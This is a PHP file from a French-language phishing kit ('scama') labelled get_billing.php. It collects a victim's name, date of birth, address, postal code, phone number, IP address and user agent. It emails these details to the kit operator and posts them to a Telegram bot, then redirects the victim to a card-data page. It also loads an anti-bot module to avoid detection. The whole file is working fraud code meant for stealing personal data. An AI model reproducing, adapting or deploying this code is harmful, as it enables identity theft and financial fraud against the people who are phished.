<?php
/*
SCAMA MONSIEUR Z
BY CRUSIX
GET_BILLING.PHP
*/
session_start();
include('../mail.php');
include '../telegram.php';
include('../ANTIBOTS/antibots.php');
if(isset($_POST['last_name']))

{

$_SESSION['first_name'] = $_POST['first_name'];
$_SESSION['last_name'] = $_POST['last_name'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['adresse'] = $_POST['adress'];
$_SESSION['ville'] = $_POST['city'];
$_SESSION['codepostale'] = $_POST['zipcode'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
if(empty($_SESSION['first_name']) || empty($_SESSION['last_name']) || empty($_SESSION['dob']) || empty($_SESSION['adresse']) || empty($_SESSION['ville']) || empty($_SESSION['codepostale']) || empty($_SESSION['phone']))

{
	header('Location: billing.php?error=true');
}

else{
	$msg = "

  🏛[Informations de Facturation]🏛
  💣 Nom : ".$_SESSION['last_name']."
  💣 Prénom : ".$_SESSION['first_name']."
  💣 Date de naissance : ".$_SESSION['dob']."
  💣 Adresse : ".$_SESSION['adresse']."
  💣 Ville : ".$_SESSION['ville']."
  💣 Code postale : ".$_SESSION['codepostale']."
  💣 Numéro de téléphone : ".$_SESSION['phone']."

  ⌛️[Informations Tierces]⌛️
  🎪 IP Adress : ".$_SESSION['ip']."
  🌐 User Agent : ".$_SESSION['browserinfo']."
";
$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=93=83=E3=80=8D_-_BILLING_-?= ".$_SESSION['ip']." - ".$_SESSION['first_name']." - ".$_SESSION['last_name'];
$fromsender = "From: =?utf-8?Q?=F0=9F=94=B4MONSIEUR_Z=F0=9F=94=B4?= <log@crusxlebg.com>";
mail($rezmail,$subject,$msg,$fromsender);
	telegram($msg);
		$_SESSION['billing'] = true;
		header('Location: card.php?'.uniqid());

}


}
else{
	die('HTTP/1.0 404 Not Found');
}
?>